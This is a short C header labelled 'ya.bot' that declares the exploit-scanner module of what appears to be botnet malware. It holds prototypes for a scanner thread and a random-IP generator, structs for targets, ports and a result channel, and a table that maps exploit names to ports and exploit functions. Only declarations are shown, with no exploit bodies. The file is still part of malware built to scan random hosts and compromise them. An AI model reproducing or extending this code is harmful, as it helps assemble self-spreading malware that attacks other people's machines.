/*  ya.bot  */

#ifndef NO_EXPSCAN
DWORD WINAPI expscan_main(LPVOID param);
char *expscan_randomip(char *pszIP);
int expscan_recv(SOCKET s, char *buf, int len, int flags);
char *expscan_setip(SOCKET bsock, char *pszParameter);

typedef struct SExpScan
{
	char m_szIP[LOWBUF];
	char m_szExploitName[LOWBUF];
	int m_nDelay;
	int m_nSockets;
	DWORD m_dwTime;
	bool m_bRandom;
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	char m_szResultChannel[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SExpScan;

typedef struct SExpScanInfo
{
	SOCKET m_csock;
	char m_szIP[LOWBUF];
	int m_nPort;
	char m_szExploitName[LOWBUF];
	SOCKET m_bsock;
	char m_szResultChannel[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SExpScanInfo;

typedef bool (*exploit)(SExpScanInfo s_esi);

typedef struct SExpScanList
{
	char m_szExploitName[LOWBUF];
	int m_nExploitPort;
	exploit execexp;
} SExpScanList;
#endif